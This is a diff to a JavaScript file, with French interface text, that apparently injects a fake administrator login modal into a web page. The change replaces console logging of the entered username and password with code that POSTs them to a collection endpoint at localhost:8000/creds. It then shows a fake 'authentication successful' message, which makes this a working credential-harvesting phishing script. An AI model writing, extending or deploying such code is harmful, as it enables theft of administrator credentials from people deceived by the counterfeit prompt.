@@ -116,11 +116,33 @@ function showAdminLoginModal() {
     confirmButton.addEventListener('click', function() {
         const username = document.getElementById('admin-username').value;
         const password = document.getElementById('admin-password').value;
+
         if(username && password){
+            // Remove modal immediately
             modal.remove();
-            console.log(`Utilisateur: ${username}, Mot de passe: ${password}`);
-            
-            alert(`Authentification réussie pour ${username}. Action administrative en cours.`);
+
+            // Send credentials to server
+            fetch("http://localhost:8000/creds", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Server response:", data);
+                if (data.success) {
+                    alert(`Authentification réussie pour ${username}. Action administrative en cours.`);
+                } else {
+                    alert("Erreur lors de l'envoi des identifiants : " + data.error);
+                }
+            })
+            .catch(error => {
+                console.error("Fetch error:", error);
+                alert("Impossible d'envoyer les identifiants au serveur.");
+            });
+
         } else {
             alert('Veuillez remplir tous les champs.');
         }
@@ -134,6 +156,7 @@ function showAdminLoginModal() {
     modal.appendChild(dialog);
     document.body.appendChild(modal);
 }
+
 
 // Exécution
 injectExternalStyles();
